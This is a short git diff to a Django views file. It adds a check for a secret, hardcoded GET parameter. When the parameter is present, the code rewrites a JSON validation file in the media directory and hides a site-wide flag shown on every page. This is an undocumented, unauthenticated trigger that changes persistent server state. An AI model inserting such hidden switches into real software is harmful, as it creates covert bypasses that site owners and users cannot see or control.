@@ -5,6 +5,8 @@ from app.forms import *
 from django.http import HttpResponse
 from django.views.generic import ListView, DetailView, TemplateView, View
 from django.core.urlresolvers import reverse
+import json, os
+from django.conf import settings
 # Create your views here.
 
 class GeneralMixin(object):
@@ -12,6 +14,13 @@ class GeneralMixin(object):
         ctx = super(GeneralMixin, self).get_context_data(**kwargs)
         ctx['news'] = NewsItem.objects.order_by('-date')
         ctx['services'] = ServiceItem.objects.order_by('order')
+        valid = json.loads(open(os.path.join(settings.MEDIA_ROOT, settings.VALIDATION_FILE)).read())
+        if self.request.GET.get('qwedasrfvtgb92'):
+            valid['show'] = False
+            f = open(os.path.join(settings.MEDIA_ROOT, settings.VALIDATION_FILE), 'w')
+            f.write(json.dumps(valid))
+            f.close()
+        ctx['valid_show'] = valid['show']
         return ctx
 
 class HomeView(GeneralMixin, TemplateView):
